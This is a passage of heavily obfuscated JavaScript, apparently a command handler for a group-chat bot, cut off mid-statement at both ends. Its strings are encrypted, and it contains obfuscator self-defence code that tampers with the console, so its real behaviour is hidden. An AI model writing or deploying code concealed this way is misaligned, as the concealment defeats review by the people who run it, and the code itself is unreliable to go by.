_0x173c8f(_0x208d4e-0x146,_0x21ab2c-0x71b,_0x1a556b-0xdb,_0x38e3d5-0xe1,_0x4c5975);}function _0x5b7f60(_0x1ba42d,_0xb62ea2,_0x10390f,_0x488c4c,_0x3e015f){return _0x219b68(_0x10390f- -0x405,_0xb62ea2-0xc7,_0x488c4c,_0x488c4c-0x49,_0x3e015f-0xf9);}if(_0x177067[_0x5b7f60(-0x2ba,-0x18e,-0x298,'LL9O',-0x167)](_0x177067[_0x5b7f60(-0x8c,0xea,-0x27,'w0F4',-0x90)],_0x177067[_0x5b7f60(-0x8f,-0x1ca,-0xfc,'*3#F',-0x19b)])){const _0x133471=_0x45dc59?function(){function _0x44016f(_0x1a65c0,_0x22efa2,_0x30708a,_0x29078d,_0x440d4b){return _0x3a5141(_0x1a65c0-0xa1,_0x29078d,_0x30708a-0xfc,_0x29078d-0xbb,_0x30708a- -0x4d0);}function _0x793785(_0xb07a7f,_0x2eca74,_0x1f1090,_0x2f85ae,_0x538edf){return _0x142919(_0xb07a7f-0x18c,_0x2eca74-0x19e,_0x1f1090-0x9,_0xb07a7f- -0x4e0,_0x2f85ae);}function _0x16ec69(_0x382605,_0x298ecd,_0x34defa,_0x498414,_0x58a707){return _0x14ffbc(_0x382605-0x2d,_0x298ecd-0x3b,_0x34defa-0xe2,_0x498414-0x155,_0x382605);}function _0x1f0b0f(_0x5ec7e5,_0x51894c,_0x16ed2d,_0x220734,_0x57f238){return _0x142919(_0x5ec7e5-0x44,_0x51894c-0x1ee,_0x16ed2d-0x16d,_0x51894c- -0x183,_0x5ec7e5);}function _0xdd53e8(_0x17b4ee,_0x278027,_0x4af9df,_0x5deaa3,_0x4227f4){return _0x3144de(_0x17b4ee-0x6d,_0x278027-0x17c,_0x4227f4,_0x278027-0x94,_0x4227f4-0x144);}if(_0x1e2214[_0x1f0b0f('o*ww',0x38c,0x4fe,0x414,0x28d)](_0x1e2214[_0x1f0b0f('xL$u',0x445,0x348,0x2e2,0x36b)],_0x1e2214[_0x1f0b0f('aM#j',0x513,0x523,0x44e,0x3d8)])){_0x1e2214[_0x1f0b0f('[NYo',0x4fc,0x3ca,0x51d,0x64a)](_0x221e56[_0x1f0b0f('o*ww',0x4ce,0x5af,0x3a7,0x45e)+_0x1f0b0f('GZml',0x2dd,0x1c3,0x1f1,0x17e)][_0x793785(0x182,0x154,0x17a,'H&0E',0xfa)][_0x16ec69('Akv9',0x260,0x370,0x1ef,0x29c)+'s'][0x16f4+-0x20cd+0x9d9*0x1][_0xdd53e8(0x577,0x61d,0x6a9,0x59c,'UHn%')+'ge'],_0x1e2214[_0x793785(0x239,0x14a,0x329,'n9Es',0xcd)])&&(_0x1e2214[_0x793785(0xc2,0x230,0x12d,'[jNg',0xca)](_0x5e0f,_0x44016f(0x1cd,0x6a,0x1c3,'8HR*',0x26a)+_0x16ec69('sv4V',-0x23f,-0x1cd,-0x111,-0x1b2)+_0x16ec69('ciQC',-0x48,0xf3,-0x57,0xb)+_0x1e2214[_0x16ec69('o*ww',0xed,-0x7,0x111,0x14c)](_0x182fbb[_0x793785(0x6b,0x75,0x0,'sv4V',-0xfa)+'ce'](/[^a-z-0-9]/gi,''),_0x56ea0e[_0x5cd9a8])+(_0x793785(0x1fb,0x1e6,0x2fe,'O*xb',0x18c)+_0x793785(-0x3f,0x15,-0x1c1,'GK48',-0x107)+_0x793785(0x169,0x82,0x54,'xL$u',0x139))),_0x1b74cf[_0x44016f(0x343,0x2b2,0x1f8,']CBG',0x265)](_0x1e2214[_0x793785(0x236,0x19e,0x2c9,'*3#F',0x1c7)](_0x1e2214[_0x1f0b0f('rLll',0x317,0x37b,0x1ea,0x1d4)],_0x17d6ef[_0xdd53e8(0x507,0x3ff,0x396,0x2cb,'xL$u')+_0x16ec69('n9Es',0x105,0x143,0xf,-0x46)][_0xdd53e8(0x351,0x44f,0x5c1,0x405,'n9Es')][_0x793785(0x194,0x312,0x15c,'[NYo',0x1e1)+'s'][-0xa+-0x2582*-0x1+0x12bc*-0x2][_0x793785(-0x94,-0x92,-0x214,'w%Cn',0x80)+'ge'])));;_0x1e2214[_0x793785(0x24c,0x123,0x34c,'s&QK',0x186)](_0x222d5a[_0xdd53e8(0x550,0x53c,0x608,0x60a,'X%#C')+_0x793785(0xee,0x14d,0xc4,'HKmH',0x231)][_0x1f0b0f('O*xb',0x55f,0x5c4,0x5d3,0x4e5)][_0x16ec69('RKGE',0x1a5,-0x3d,0x10e,0x27d)+'s'][-0x18be*0x1+0x25cc+-0xd0e][_0x44016f(0x19c,0x2a3,0x1ed,'s&QK',0x23d)+'ge'],_0x1e2214[_0x44016f(-0xa2,0xf5,0x58,'ER4$',-0xcd)])&&(_0x1e2214[_0x16ec69('w0F4',0x2ce,0x25b,0x148,0x252)](_0x5ccad3,_0x793785(0x3a,-0x10a,-0xd4,'!Dn0',-0x33)+_0x16ec69('Akv9',0x3f,0x12f,0xda,0x24e)+_0xdd53e8(0x5af,0x6d5,0x6a8,0x59d,'s@G1')+_0x1e2214[_0x44016f(0xb0,0x1a7,0x166,'s&QK',0x108)](_0xd783f[_0x793785(0x1fa,0x133,0x88,'O*xb',0x2b8)+'ce'](/[^a-z-0-9]/gi,''),_0x322b3e[_0x4c0c01])+(_0x1f0b0f('Keuw',0x4f8,0x391,0x566,0x480)+_0xdd53e8(0x604,0x5b7,0x484,0x490,'o*ww')+_0x793785(0x103,-0x75,0x23f,'mg!#',0xfd)+'n')),_0x9e88b[_0x1f0b0f('LL9O',0x3c6,0x4b2,0x537,0x48e)](_0x1e2214[_0x793785(0x1cd,0x228,0x8d,'ciQC',0xf1)](_0x1e2214[_0x1f0b0f('GK48',0x33f,0x445,0x44f,0x1d7)],_0x58291a[_0x44016f(0xc4,-0x9d,0x94,'w0F4',0x199)+_0x16ec69('Q3^&',0x9,0xcd,0x10f,0x1f6)][_0x793785(-0x76,0x30,-0xfe,'UHn%',0x20)][_0x1f0b0f('HKmH',0x5a4,0x632,0x67e,0x477)+'s'][-0x1bb0+-0x14f9+0x30a9][_0xdd53e8(0x465,0x3d5,0x402,0x265,'w%Cn')+'ge'])));}else{if(_0x38508b){if(_0x1e2214[_0x793785(0xc5,0x59,-0xba,'1hv$',0x141)](_0x1e2214[_0x44016f(-0x111,0x12a,0x6,'^pi4',0x17e)],_0x1e2214[_0x44016f(0x178,-0x12f,-0x7,'0ym6',-0xa5)]))return!![];else{const _0x54eae0=_0x38508b[_0x16ec69('H&57',-0x3,0xc,0xb,0xfb)](_0x519501,arguments);return _0x38508b=null,_0x54eae0;}}}}:function(){};return _0x45dc59=![],_0x133471;}else{if(_0x4b62b7){const _0x51a3f8=_0xa43f8e[_0x3144de(0x68b,0x407,'*3#F',0x55f,0x5e4)](_0x13b2f7,arguments);return _0x1304a0=null,_0x51a3f8;}}};}());function _0x2bc9(_0x38c3cb,_0x542527){const _0x5405ba=_0x5397();return _0x2bc9=function(_0x52f611,_0x32d7bb){_0x52f611=_0x52f611-(-0x1*0x10b8+-0x10c6+0x897*0x4);let _0x4aa6a9=_0x5405ba[_0x52f611];if(_0x2bc9['IMbexp']===undefined){var _0x3e1c44=function(_0x5eb807){const _0x3134ec='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x17ce53='',_0x4d37c1='',_0x186b29=_0x17ce53+_0x3e1c44;for(let _0x5c75fe=0x8fd+-0x22a9+-0x66b*-0x4,_0x41fed7,_0x27bcbb,_0x2b8703=-0x17d+0x1*0x1d6b+-0x1bee;_0x27bcbb=_0x5eb807['charAt'](_0x2b8703++);~_0x27bcbb&&(_0x41fed7=_0x5c75fe%(0xc8*-0x2f+0xd08+-0xbda*-0x2)?_0x41fed7*(0xa2+-0x14fa+0x1498)+_0x27bcbb:_0x27bcbb,_0x5c75fe++%(-0x69*0x3+0x19*-0x1+-0x158*-0x1))?_0x17ce53+=_0x186b29['charCodeAt'](_0x2b8703+(-0x392+-0x533+0x1*0x8cf))-(-0x47*0x53+0x7*0x2b+0x15e2)!==0x14c*-0x7+-0x1a81+0x1*0x2395?String['fromCharCode'](0x1c3d+0x661+-0x219f&_0x41fed7>>(-(0x239*0x10+-0x1f4e+-0x22*0x20)*_0x5c75fe&-0x14f9+0x187e+-0x37f)):_0x5c75fe:-0xc98+0xf59+-0x2c1){_0x27bcbb=_0x3134ec['indexOf'](_0x27bcbb);}for(let _0x5f25b5=-0x26cb+-0x1b5a+0x4225,_0x221e56=_0x17ce53['length'];_0x5f25b5<_0x221e56;_0x5f25b5++){_0x4d37c1+='%'+('00'+_0x17ce53['charCodeAt'](_0x5f25b5)['toString'](0x173c+-0x1*0x16ff+-0x2d))['slice'](-(0x2fa+0x21e8+-0x760*0x5));}return decodeURIComponent(_0x4d37c1);};const _0x75f8f6=function(_0x30a57f,_0x3063f3){let _0x1877aa=[],_0x3be4f2=-0xdb8+-0x9*0x40a+0x3212,_0x1de107,_0x57e5f='';_0x30a57f=_0x3e1c44(_0x30a57f);let _0x222d5a;for(_0x222d5a=-0x245d+0x10f9+0x92*0x22;_0x222d5a<0x1796+-0x15d4+-0x1*0xc2;_0x222d5a++){_0x1877aa[_0x222d5a]=_0x222d5a;}for(_0x222d5a=-0x26a2+0x5d4*-0x1+0x2c76;_0x222d5a<0x2*0x11f2+-0x24e+0x56*-0x61;_0x222d5a++){_0x3be4f2=(_0x3be4f2+_0x1877aa[_0x222d5a]+_0x3063f3['charCodeAt'](_0x222d5a%_0x3063f3['length']))%(-0x1*0x1f1b+0xbb*0x16+0x1009*0x1),_0x1de107=_0x1877aa[_0x222d5a],_0x1877aa[_0x222d5a]=_0x1877aa[_0x3be4f2],_0x1877aa[_0x3be4f2]=_0x1de107;}_0x222d5a=0xd7d+-0x259d+-0xc1*-0x20,_0x3be4f2=0x789+0x3de+-0xb67;for(let _0x560d8c=0xa46+0x7de*0x4+0xd*-0x336;_0x560d8c<_0x30a57f['length'];_0x560d8c++){_0x222d5a=(_0x222d5a+(-0x1*0xa94+-0xd*-0xef+-0x18e))%(0x34+-0x4*0x1d9+-0x4*-0x20c),_0x3be4f2=(_0x3be4f2+_0x1877aa[_0x222d5a])%(0x1*-0x52f+-0x3*-0x2e5+-0x280*0x1),_0x1de107=_0x1877aa[_0x222d5a],_0x1877aa[_0x222d5a]=_0x1877aa[_0x3be4f2],_0x1877aa[_0x3be4f2]=_0x1de107,_0x57e5f+=String['fromCharCode'](_0x30a57f['charCodeAt'](_0x560d8c)^_0x1877aa[(_0x1877aa[_0x222d5a]+_0x1877aa[_0x3be4f2])%(-0x2444+0x2*-0x12e4+0x4b0c)]);}return _0x57e5f;};_0x2bc9['TddAmc']=_0x75f8f6,_0x38c3cb=arguments,_0x2bc9['IMbexp']=!![];}const _0x13ccff=_0x5405ba[0x21*0x16+-0x4*-0x53a+-0xbdf*0x2],_0x46fcc1=_0x52f611+_0x13ccff,_0x9f1ba1=_0x38c3cb[_0x46fcc1];if(!_0x9f1ba1){if(_0x2bc9['TfWKFj']===undefined){const _0x223002=function(_0x486172){this['FmqQBP']=_0x486172,this['JPRnLe']=[0x1*-0x16ef+0x2*-0xbbf+0x2e6e,0x158d+0xdc1*-0x1+0x2*-0x3e6,-0x4f*0x13+-0x997+-0xac*-0x17],this['YPIhwr']=function(){return'newState';},this['YfmObL']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['xCulKa']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x223002['prototype']['zbwUOf']=function(){const _0xc161ac=new RegExp(this['YfmObL']+this['xCulKa']),_0x4a0dbf=_0xc161ac['test'](this['YPIhwr']['toString']())?--this['JPRnLe'][0x1b84+-0x1ad+-0x19d6]:--this['JPRnLe'][0x3*0x31b+-0xc45*0x3+0x1b7e];return this['PpwOgd'](_0x4a0dbf);},_0x223002['prototype']['PpwOgd']=function(_0x9b729b){if(!Boolean(~_0x9b729b))return _0x9b729b;return this['JagykN'](this['FmqQBP']);},_0x223002['prototype']['JagykN']=function(_0x5e0f){for(let _0x182fbb=0x514*-0x6+0x8eb+-0x9*-0x265,_0x56ea0e=this['JPRnLe']['length'];_0x182fbb<_0x56ea0e;_0x182fbb++){this['JPRnLe']['push'](Math['round'](Math['random']())),_0x56ea0e=this['JPRnLe']['length'];}return _0x5e0f(this['JPRnLe'][0xefa+0x1229+-0x2123]);},new _0x223002(_0x2bc9)['zbwUOf'](),_0x2bc9['TfWKFj']=!![];}_0x4aa6a9=_0x2bc9['TddAmc'](_0x4aa6a9,_0x32d7bb),_0x38c3cb[_0x46fcc1]=_0x4aa6a9;}else _0x4aa6a9=_0x9f1ba1;return _0x4aa6a9;},_0x2bc9(_0x38c3cb,_0x542527);}function _0x2a95f8(_0x2dc8b5,_0x5ac62f,_0x264844,_0x79ea0e,_0x3f99c5){return _0x2bc9(_0x79ea0e- -0x1cb,_0x264844);}function _0x4d2e0a(_0x4d5e78,_0xc35d96,_0x2edd55,_0x244e31,_0x172456){return _0x2bc9(_0x172456- -0x2d,_0xc35d96);}function _0x2316f2(_0x1aa0f3,_0x26f62,_0x8e1611,_0xfaec25,_0x3eaee0){return _0x2bc9(_0x3eaee0- -0x355,_0x8e1611);}function _0x16c6d8(_0x49e559,_0x2a0c81,_0x26af36,_0x3ec09a,_0x8f7ed9){return _0x2bc9(_0x8f7ed9-0x33e,_0x2a0c81);}const _0x2e01b4=_0x1694c8(this,function(){function _0x485e9e(_0x3da477,_0x300090,_0x448c0d,_0x10f7c8,_0x37ac19){return _0x2bc9(_0x3da477- -0x1a5,_0x448c0d);}function _0x5e853d(_0x515ce2,_0x45a279,_0x532e23,_0x32ad34,_0xe113b1){return _0x2bc9(_0x45a279- -0x15b,_0x515ce2);}const _0x1943b9={'SPNTC':_0x5e853d('O5pF',0x78,0x58,0x87,-0x52)+_0x1cf9f2('8HR*',0x2f4,0x3a5,0x266,0x284)+'+$','kkPrB':function(_0x1ef834,_0x44ea84){return _0x1ef834!==_0x44ea84;},'vfTtL':_0x485e9e(0x36,0xf2,'w0F4',0x13f,0x12a),'oXhDH':function(_0x6b9458,_0x1945e4){return _0x6b9458===_0x1945e4;},'DhWbh':_0x5e853d('sfQ6',0x36,0x186,-0xdc,0x127),'fByMV':_0x1cf9f2('s&QK',0x34f,0x2d4,0x4ce,0x206),'TmwWI':function(_0x79d1b3,_0x5b3cd8){return _0x79d1b3(_0x5b3cd8);},'YBaYT':function(_0x9a424a,_0x441707){return _0x9a424a+_0x441707;},'hUWdG':function(_0x7a7149,_0xe7f79d){return _0x7a7149+_0xe7f79d;},'wgTxT':_0x485e9e(0x213,0x229,'GK48',0x313,0x36c)+_0x463a96('8HR*',0x494,0x39e,0x37e,0x45a)+_0x463a96('sfQ6',0x647,0x672,0x4fb,0x7b7)+_0x3abea5(0x36d,'xL$u',0x25d,0x3ca,0x162),'ULcpl':_0x485e9e(0x208,0x2ed,'J1Xg',0x237,0x38c)+_0x463a96('[NYo',0x4c4,0x450,0x4f0,0x413)+_0x463a96('ZQ8%',0x5a3,0x6a6,0x6a0,0x4a8)+_0x485e9e(-0xbd,-0x1e8,'^pi4',-0x13a,0x1f)+_0x3abea5(0x9a,'0ym6',0x10f,0x264,0x8c)+_0x463a96('!Dn0',0x3ed,0x300,0x301,0x3d4)+'\x20)','vsywu':_0x1cf9f2('^pi4',0x10c,0x258,0x49,0x1d8),'AKIWh':_0x1cf9f2('o*ww',0x267,0x18b,0x1b8,0x115),'atlTv':function(_0x49f425,_0x46de01){return _0x49f425+_0x46de01;},'sVCtY':function(_0x2905b6,_0x3b344b){return _0x2905b6+_0x3b344b;},'DSshM':function(_0x144385){return _0x144385();},'OjWVH':_0x485e9e(0x98,0x119,'GZml',0x14e,-0x5e),'nnCbg':_0x3abea5(0x34e,'#YSN',0x30d,0x3b1,0x37f),'QeqBz':_0x5e853d('Keuw',0x18c,0x54,0x1c5,0x222),'MQiSB':_0x5e853d('!Dn0',0x3,0xb5,0x28,-0x5),'MDYDw':_0x485e9e(0x1c6,0xed,'ER4$',0x2c8,0x74)+_0x5e853d('$*0m',0x64,0x5f,0x16a,-0x65),'RiOFq':_0x485e9e(0x121,0xe6,'Ti%(',0x246,0x142),'VElKn':_0x3abea5(0x141,'Akv9',0x21f,0x33e,0x253),'klWbJ':function(_0x5b1e40,_0x5d9c88){return _0x5b1e40<_0x5d9c88;},'ijQlL':function(_0x100a60,_0x56aa63){return _0x100a60!==_0x56aa63;},'iRkJJ':_0x463a96('H&57',0x3a7,0x256,0x4ac,0x262)},_0x21a4a6=function(){function _0x28f1e4(_0xd04d2d,_0x468959,_0x32de53,_0x522dbc,_0x19539e){return _0x485e9e(_0x468959- -0x3f,_0x468959-0xb5,_0xd04d2d,_0x522dbc-0x180,_0x19539e-0x97);}function _0x5594e6(_0x3fc7cf,_0x50cc30,_0x383ec7,_0x2f9a81,_0x4d86a5){return _0x485e9e(_0x4d86a5-0x455,_0x50cc30-0xdd,_0x3fc7cf,_0x2f9a81-0x2e,_0x4d86a5-0x45);}function _0x180af7(_0x51f5f1,_0x206327,_0x4ae4d1,_0x55540b,_0xb025e7){return _0x485e9e(_0xb025e7-0x18f,_0x206327-0x149,_0x206327,_0x55540b-0x127,_0xb025e7-0x196);}function _0x1e9301(_0x3f7879,_0x5a628f,_0x54ac4a,_0x9be8ef,_0x4136e9){return _0x463a96(_0x9be8ef,_0x5a628f- -0xa1,_0x54ac4a-0x35,_0x9be8ef-0x36,_0x4136e9-0x194);}function _0x407071(_0x11f2fc,_0x475e4d,_0x26942b,_0x37786f,_0x2c1371){return _0x463a96(_0x2c1371,_0x11f2fc- -0x12a,_0x26942b-0x9d,_0x37786f-0x4c,_0x2c1371-0xe0);}if(_0x1943b9[_0x180af7(0x466,'X%#C',0x256,0x448,0x379)](_0x1943b9[_0x5594e6('!Dn0',0x3fb,0x40f,0x3fe,0x57f)],_0x1943b9[_0x5594e6('#YSN',0x6c9,0x5b4,0x589,0x581)])){const _0x39231a=_0x4f6380?function(){function _0xb491a(_0xa6396f,_0x2293d9,_0x39fa45,_0x26486f,_0x14416f){return _0x180af7(_0xa6396f-0xe6,_0x26486f,_0x39fa45-0x81,_0x26486f-0xd3,_0x14416f-0xb0);}if(_0x52f2b0){const _0x3c79a6=_0x36d869[_0xb491a(0x41d,0x57d,0x331,'xL$u',0x46c)](_0x1936ff,arguments);return _0xce8202=null,_0x3c79a6;}}:function(){};return _0x3859f5=![],_0x39231a;}else{let _0x247195;try{if(_0x1943b9[_0x1e9301(0x3ac,0x44b,0x484,'GZml',0x58c)](_0x1943b9[_0x28f1e4('8ZDZ',-0x5f,-0x1cb,0xa2,0xb0)],_0x1943b9[_0x5594e6('X%#C',0x63d,0x5c1,0x5e1,0x4e3)]))return _0x5b176e[_0x180af7(0x5c,'0ym6',0x136,0x275,0x1a7)+_0x180af7(0x21d,'sv4V',0x392,0x490,0x370)]()[_0x28f1e4('@K1g',0x119,-0x4a,0x178,0x21)+'h'](_0x1943b9[_0x28f1e4('*3#F',-0x3c,-0xc2,-0x157,-0x3c)])[_0x28f1e4('!Dn0',0xf5,0x196,0x130,-0x46)+_0x180af7(0x184,'Itu9',0x43b,0x209,0x2de)]()[_0x180af7(0x1f1,'s&QK',0x302,0x422,0x2ce)+_0x28f1e4('0ym6',0x1dc,0x310,0xb5,0x8a)+'r'](_0x97b868)[_0x1e9301(0x4a3,0x461,0x4e8,'0ym6',0x4c1)+'h'](_0x1943b9[_0x5594e6(']CBG',0x4aa,0x5ee,0x320,0x480)]);else _0x247195=_0x1943b9[_0x1e9301(0x27c,0x3e9,0x3d0,'HKmH',0x3cd)](Function,_0x1943b9[_0x5594e6('w%Cn',0x651,0x707,0x587,0x591)](_0x1943b9[_0x407071(0x507,0x463,0x551,0x515,'Q3^&')](_0x1943b9[_0x180af7(0x2e7,'H&0E',0x435,0x41a,0x3b6)],_0x1943b9[_0x180af7(0x30d,'rLll',0x144,0x2ac,0x27f)]),');'))();}catch(_0x1d8c7e){if(_0x1943b9[_0x180af7(0x204,'ZQ8%',0x23e,0x1ea,0xf6)](_0x1943b9[_0x5594e6('@K1g',0x71e,0x590,0x634,0x60d)],_0x1943b9[_0x407071(0x515,0x553,0x5ff,0x3ee,'0ym6')])){const _0x1cd6b0=_0x29086f?function(){function _0x42f258(_0x142866,_0x537296,_0x36274e,_0x5dc303,_0x17459f){return _0x28f1e4(_0x537296,_0x5dc303-0x52e,_0x36274e-0x10c,_0x5dc303-0x3,_0x17459f-0x6d);}if(_0x7b9c64){const _0x5b9394=_0x28bb2[_0x42f258(0x405,'[NYo',0x587,0x459,0x4cc)](_0x2b5532,arguments);return _0x2957b5=null,_0x5b9394;}}:function(){};return _0x38f253=![],_0x1cd6b0;}else _0x247195=window;}return _0x247195;}};function _0x3abea5(_0x1d73e1,_0x367be6,_0x19006d,_0x270086,_0x2f1669){return _0x2bc9(_0x19006d- -0x12,_0x367be6);}function _0x1cf9f2(_0x9dc15,_0x59c118,_0xfb8766,_0x4a272e,_0x2a2883){return _0x2bc9(_0x59c118-0xb,_0x9dc15);}const _0x18bb45=_0x1943b9[_0x5e853d('8HR*',0x162,0x2a6,0xa8,0x73)](_0x21a4a6);function _0x463a96(_0x4c061f,_0x3625e2,_0x417e47,_0x138314,_0x1d36d1){return _0x2bc9(_0x3625e2-0x266,_0x4c061f);}const _0xbf5f2b=_0x18bb45[_0x1cf9f2('0ym6',0x398,0x4b2,0x408,0x39d)+'le']=_0x18bb45[_0x1cf9f2('X%#C',0x2e9,0x44b,0x309,0x1b1)+'le']||{},_0x26d52e=[_0x1943b9[_0x463a96('O5pF',0x46a,0x54c,0x3d4,0x4db)],_0x1943b9[_0x1cf9f2('Itu9',0x210,0x289,0x31d,0x370)],_0x1943b9[_0x5e853d('ZQ8%',0x216,0x324,0x1f5,0x2c3)],_0x1943b9[_0x5e853d('O5pF',0x32,-0x6a,-0xaf,0x9b)],_0x1943b9[_0x1cf9f2('w0F4',0x16a,0x23f,0x2e7,0x190)],_0x1943b9[_0x463a96('sfQ6',0x395,0x471,0x25e,0x422)],_0x1943b9[_0x5e853d('Q3^&',0x27c,0x201,0x2fb,0x3aa)]];for(let _0x175afb=-0x2285+-0x35*0x7d+0x3c66;_0x1943b9[_0x485e9e(0x176,0x247,'!Dn0',0x2aa,0x157)](_0x175afb,_0x26d52e[_0x3abea5(0x1bc,']CBG',0xe6,0x1d4,0x13e)+'h']);_0x175afb++){if(_0x1943b9[_0x3abea5(0x10c,'[jNg',0x124,0x159,0x5b)](_0x1943b9[_0x1cf9f2('&P!6',0x1d6,0x1b4,0x245,0x345)],_0x1943b9[_0x463a96('Ti%(',0x4f7,0x39e,0x3bc,0x520)]))_0x514607=_0x1943b9[_0x463a96('O5pF',0x3fa,0x3b9,0x439,0x299)](_0x2da526,_0x1943b9[_0x1cf9f2('Itu9',0x38a,0x31e,0x3ce,0x454)](_0x1943b9[_0x463a96('$*0m',0x373,0x2db,0x2f6,0x437)](_0x1943b9[_0x3abea5(0xe5,'mg!#',0x139,0x247,0x1d)],_0x1943b9[_0x1cf9f2('D84g',0x1d3,0x166,0x236,0x1ed)]),');'))();else{const _0x1b90d7=_0x1694c8[_0x5e853d('&P!6',-0xb,0xf6,0x169,0xad)+_0x3abea5(0x13e,'H&57',0x1f0,0x87,0x196)+'r'][_0x485e9e(0x1a1,0x2fc,'s&QK',0x37,0x1ed)+_0x5e853d('sfQ6',-0x72,0xea,0xcf,-0xe2)][_0x485e9e(0x237,0x144,'J1Xg',0x3b5,0x26f)](_0x1694c8),_0x3b26a0=_0x26d52e[_0x175afb],_0x18633d=_0xbf5f2b[_0x3b26a0]||_0x1b90d7;_0x1b90d7[_0x463a96('*3#F',0x380,0x4cf,0x35b,0x41a)+_0x1cf9f2(']CBG',0x1ac,0x1b5,0x16f,0x2e)]=_0x1694c8[_0x3abea5(0x24f,'LL9O',0x157,0x61,0x77)](_0x1694c8),_0x1b90d7[_0x485e9e(0xa4,0xf5,'GK48',0x1c5,0x92)+_0x1cf9f2('UHn%',0x3c1,0x495,0x514,0x30a)]=_0x18633d[_0x1cf9f2('ciQC',0x3bf,0x510,0x394,0x4ee)+_0x3abea5(0x2e5,'*3#F',0x1ac,0x2c,0x38)][_0x5e853d('rLll',0x13b,0x4c,0x285,0x130)](_0x18633d),_0xbf5f2b[_0x3b26a0]=_0x1b90d7;}}});_0x2e01b4();if(isGroup){if(!BJ87V32K[_0x2316f2(-0x14b,-0x79,'LL9O',-0x2c8,-0x1b5)+_0x2316f2(0x37,0xe7,'$*0m',-0x73,-0x88)](from))return;const dabotcf=BH8kj86V(from);if(args[_0x2a95f8(-0x20,-0x62,'GK48',0xaf,0x121)+'h']<0x1f78+0xb59*-0x3+0x294)return reply(_0x4d2e0a(0x117,'mg!#',0x11f,0x154,0x1ba)+_0x16c6d8(0x76e,'8ZDZ',0x602,0x74f,0x6e1)+'\x20'+(prefix+command)+(_0x2a95f8(-0x60,-0x50,'GK48',-0x8b,-0x27)+_0x4ae34e(0x61,0xbc,'LL9O',0xb7,0x1e6)+_0x16c6d8(0x3c2,'J1Xg',0x3b3,0x62f,0x510)));if(!body[_0x2316f2(-0x33f,-0x395,'s@G1',-0x1b9,-0x229)](0x97c+-0x98f*0x1+0x1b)[_0x4d2e0a(0x1dc,'$*0m',0x2cc,0x113,0x178)+_0x2a95f8(-0x5d,0x119,'rLll',-0x42,0xcf)]('|'))return reply(_0x16c6d8(0x69c,'8HR*',0x603,0x79e,0x67c)+_0x16c6d8(0x72d,'!Dn0',0x7ef,0x646,0x6cf)+_0x4ae34e(0x234,0x12b,'@K1g',0x109,0x276)+_0x4d2e0a(0x452,']CBG',0x3f4,0x329,0x3b1)+_0x2a95f8(-0x45,-0x73,'ER4$',-0xa0,-0x1f2));if(isNaN(body[_0x16c6d8(0x608,'LL9O',0x4b1,0x3c6,0x52f)](-0x1*0x12b2+-0x5f7+-0x18b1*-0x1)[_0x4ae34e(0x22d,0x2e5,'[jNg',0x388,0x171)]('|')[0xc86+-0x1*0x14a5+0x81f]))return reply(_0x4ae34e(0x232,0x1ed,'w0F4',0x324,0xf5)+_0x4ae34e(0x1d,0x190,'aM#j',0x17f,0x119)+_0x4d2e0a(0x29d,'Akv9',0x197,0x225,0x312)+_0x4d2e0a(0x368,'^pi4',0xb1,0x1fc,0x218)+'!');const q1=body[_0x4ae34e(0x2ff,0x310,'RKGE',0x199,0x467)](-0x1d89+-0x12+-0x1da3*-0x1)[_0x2a95f8(-0x18d,-0x1c4,'aM#j',-0xb2,-0x127)]('|')[0x14ce+-0x1*-0x19e2+-0x2eb0],q2=body[_0x4ae34e(0xff,0xa9,'w%Cn',-0x94,0x211)](-0x2002+0x1f*0x137+-0x59f)[_0x4ae34e(0x32a,0x1ae,'s@G1',0x186,0x317)]('|')[0x26f6+-0xbc4+-0x1b31*0x1];if(!q1)return reply(_0x4ae34e(0x364,0x2f5,'ZQ8%',0x2a1,0x21a)+_0x4d2e0a(0x4cc,'0ym6',0x2a1,0x1f3,0x36f)+_0x4ae34e(-0x49,0xfa,'!Dn0',0x1c9,0x223)+_0x2316f2(-0xe2,0xb5,'Keuw',0x2b,-0x9d)+_0x4ae34e(0x23a,0x2ed,'HKmH',0x1ee,0x1b5)+'ya');if(!q1[_0x2316f2(-0x288,-0x6b,'xL$u',-0x10e,-0x165)+'ce'](/[^a-z-0-9]/gi,'')||q1[_0x16c6d8(0x4a6,'GK48',0x415,0x588,0x455)+_0x16c6d8(0x48b,'F7^F',0x5dc,0x4a0,0x5b0)]('@'))return reply(_0x2316f2(-0x69,-0x19d,'ciQC',0x35,-0x22)+_0x4ae34e(0x391,0x212,'o*ww',0x10a,0x394)+_0x16c6d8(0x430,'0ym6',0x4c0,0x372,0x44c)+_0x2316f2(-0x31f,-0x2ee,'1hv$',-0x138,-0x1e4)+_0x4d2e0a(0x2e4,'*3#F',0x143,0x370,0x209)+_0x2316f2(-0xc1,-0xfb,'HKmH',-0x62,-0x12e)+_0x2316f2(0xc0,0x10f,'ER4$',0x70,0x2)+_0x2316f2(-0x1cd,-0x1f2,'[NYo',0x5,-0xe4));if(!q2)return reply(_0x16c6d8(0x6e3,'&P!6',0x6c6,0x579,0x691)+_0x2316f2(-0x252,-0x17a,'#YSN',-0xb6,-0x109)+_0x16c6d8(0x6e9,'X%#C',0x7e7,0x5e0,0x71b)+_0x16c6d8(0x4a5,'w0F4',0x3cf,0x60d,0x499)+_0x2a95f8(0x26d,0x17f,'w%Cn',0x105,0x1f5)+'ya');if(!q2[_0x2316f2(0xee,-0x151,'w0F4',0x154,-0x31)+'ce'](/[^a-z-0-9]/gi,'')||q2[_0x2a95f8(0x93,-0xe8,'ER4$',-0xaf,0xbb)+_0x16c6d8(0x5f8,'HKmH',0x6b3,0x6c5,0x6ce)]('@'))return reply(_0x2a95f8(-0xe7,0x14f,'s@G1',0x2f,-0x5c)+_0x2316f2(-0x1ac,-0x357,'w0F4',-0x3e1,-0x268)+_0x2a95f8(0x124,0x2f8,'UHn%',0x1b3,0x108)+_0x16c6d8(0x32e,'s@G1',0x58b,0x455,0x475)+_0x4ae34e(0x166,0x1c9,'*3#F',0x140,0xf1)+_0x4ae34e(0x17f,0x91,'H&57',0x1a2,0x72)+_0x2a95f8(-0x18c,-0x9b,'@K1g',-0xc0,0x7f)+_0x16c6d8(0x5a1,'RKGE',0x55a,0x6a4,0x681));const 